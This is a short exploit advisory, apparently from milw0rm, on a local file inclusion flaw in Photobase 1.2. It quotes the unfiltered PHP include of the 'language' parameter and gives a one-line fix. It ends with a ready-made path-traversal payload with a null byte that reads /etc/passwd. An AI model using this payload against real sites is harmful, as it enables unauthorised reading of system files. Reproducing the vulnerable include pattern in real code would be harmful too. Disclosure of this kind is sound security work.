@@ -1,0 +1,45 @@
+[START]
+
+####################################################################################################################
+[0x01] Informations:
+
+Script         : Photobase 1.2
+Download       : http://www.monstar.nl/php-bin/count.php3?what=photobase.zip&id=0
+Vulnerability  : Local File Inclusion
+Author         : Osirys
+Contact        : osirys[at]live[dot]it
+Website        : http://osirys.org
+
+
+####################################################################################################################
+[0x02] Bug: [Local File Inclusion]
+######
+
+Bugged file is: /[path]/include/header.php
+
+[CODE]
+
+<?php
+include('include/conf.php');
+include('include/functions.php');
+
+if(isset($_GET['language']))
+	$language = $_GET['language'];
+
+include('language/'.$language.'.php');
+
+[/CODE]
+
+There is an include of a variable coming from GET --> $language
+
+[!FIX] Filter $language before the include or just set its value with a local file.
+
+
+[!] EXPLOIT: /[path]/include/header.php?language=[local_file]
+                                                 ../../../../../../../../../../etc/passwd%00
+
+####################################################################################################################
+
+[/END]
+
+# milw0rm.com [2009-01-11]
